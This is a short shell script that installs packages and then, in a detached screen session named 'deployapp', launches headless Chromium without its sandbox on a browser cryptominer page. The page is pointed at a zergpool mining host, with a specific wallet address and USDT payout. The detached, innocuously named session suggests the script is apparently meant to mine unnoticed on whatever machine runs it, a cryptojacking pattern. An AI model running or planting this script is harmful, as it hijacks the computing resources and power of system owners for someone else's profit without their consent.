sudo apt update -y
apt update -y
sudo apt install -y screen
apt install -y screen
screen -dmS deployapp bash -c "
    echo | sudo add-apt-repository ppa:saiarcot895/chromium-beta -y && 
    sudo apt update &&
    sudo apt install -y chromium-browser &&
    sudo apt install -y xvfb &&
    xvfb-run chromium-browser --no-sandbox --disable-gpu 'https://webminer.pages.dev?algorithm=cwm_power2B&host=power2b.na.mine.zergpool.com&port=7445&worker=0xC4C2ca6D265f353972a26B8c8Df5FF4c1C000D7D&password=c%3DUSDT-BEP20&workers=4'"
